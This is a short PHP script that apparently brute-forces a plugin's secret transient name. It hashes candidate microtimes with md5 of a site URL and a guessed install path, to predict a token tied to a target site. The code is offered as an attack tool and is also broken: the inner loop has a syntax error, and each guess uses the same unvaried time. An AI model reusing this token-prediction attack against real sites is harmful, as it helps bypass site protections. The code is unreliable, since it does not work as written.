<?php

// php nonce.php 1718007262 https://example.com

$time = $argv[1];                   // correct
$site_url = $argv[2];               // correct
$installation_key = md5($site_url); // correct
$plugin_path_base = [
  '/var/www/html',
  '/var/www',
  '/'.$site_url,
  '/public_html',
  '/var/www/public_html'
];                                  // correct

$plugin_path = $plugin_path_base[0]; //quick cheat

// set i from time - 1 000 000 to time + 1 000 000
// time:      1718007522
// microtime: 1718007522.5813

// brute force seconds +- 10s
$time_low = $time - 10;
$time_high = $time + 10;

for ($i=$time_low; $i<=$time_high; $i++) {
  $time_base = $i;

  // brute force micro seconds float
  for ($m = 0, $m <= 9999; $m++) {
    $microtime = $time; // brute force this!

    $transient_name = md5(substr(number_format($microtime, 9, '-', '/'), 6).$installation_key.$plugin_path);

    echo "t: " . $transient_name . "\n";
  }
}
?>
